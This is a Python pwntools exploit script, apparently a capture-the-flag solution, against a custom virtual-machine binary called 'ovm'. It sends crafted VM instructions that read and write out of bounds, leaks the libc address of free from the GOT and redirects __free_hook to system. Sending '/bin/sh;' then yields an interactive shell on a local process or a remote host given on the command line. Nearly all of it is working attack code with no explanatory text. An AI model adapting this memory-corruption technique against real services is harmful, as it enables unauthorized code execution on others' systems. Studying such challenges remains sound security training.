#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./ovm"
locallibc = "./libc.so.6"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

# comment - free_got = 0xF8
# 0x10 reg3 = first_byte
# 0x30 reg3 = memory[reg1]
# 0x40 memory[reg1] = reg3
# 0x70 reg3 = reg2 + reg1
# 0x80 reg3 = reg2 - reg1
# 0xC0 reg3 = reg2 << reg1
def exp():
    free_hook = libc.sym["__free_hook"]
    free = libc.sym["free"]
    offset = free_hook - free
    pf("offset", offset)

    gdb_script = """
    b sendcomment
    """
    insts = [
        # read free_got to r3,r4
        0x1000003E,     # reg[0] = 0x3E
        0x10010000,     # reg[1] = 00
        0x80000100,     # reg[0] = reg[1] - reg[0] = -0x3E
        0x30030000,     # reg[3] = memory[reg[0]] = free_got lower four bytes
        0x10010001,     # reg[1] = 1
        0x70000001,     # reg[0] = reg[0] + reg[1] = -0x3D
        0x30040000,     # reg[4] = memory[reg[0]] = free_got higher four bytes

        # put offset to reg2
        0x10000008,                 # reg[0] = 8
        0x10010000 + (offset>>16),    # reg[1] = offset_3
        0xC0020100,                 # reg[2] = reg[1] << 8
        0x10010000 + ((offset>>8)%0x100),   # reg[1] = offset_2
        0x70020201,                 # reg[2] = reg[1] + reg[2]
        0xC0020200,                 # reg[2] = reg[2] << 8
        0x10010000 + (offset % 0x100 - 8),      # reg[1] = offset_1
        0x70020201,                 # reg[2] = reg[1] + reg[2]

        # add free_got + offset
        0x70030302,                 # reg[3] = reg[2] + reg[3]

        # put free_hook to comment
        0x10000008,                 # reg[0] = 8
        0x10010000,                 # reg[1] = 0
        0x80000100,                 # reg[0] = reg[1] - reg[0] = -8
        0x40030000,                 # memory[reg[0]] = reg[3]
        0x10010001,                 # reg[1] = 1
        0x70000001,                 # reg[0] = reg[1] + reg[0] = -7
        0x40040000,                 # memory[reg[0]] = reg[3]


        0xf1000000
    ]

    io.recvuntil("PCPC: ")
    io.sendline("0")
    io.recvuntil("SP: ")
    io.sendline("0")
    io.recvuntil("CODE SIZE: ")
    io.sendline(str(len(insts)))

    for i in insts:
        sleep(0.1)
        io.sendline(str(i))

    # gdb.attach(io, gdb_script)

    io.recvuntil("R3: ")
    lower = int(io.recv(8), 16)
    io.recvuntil("R4: ")
    free_hook = (int(io.recv(4), 16)<< 32) + lower

    libc_base = free_hook - libc.sym["__free_hook"] + 8
    system_addr = libc_base + libc.sym["system"]
    pf("libc_base", libc_base)

    io.recvuntil("HOW DO YOU FEEL AT OVM?\n")
    io.sendline(b"/bin/sh;" + p64(system_addr))

    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()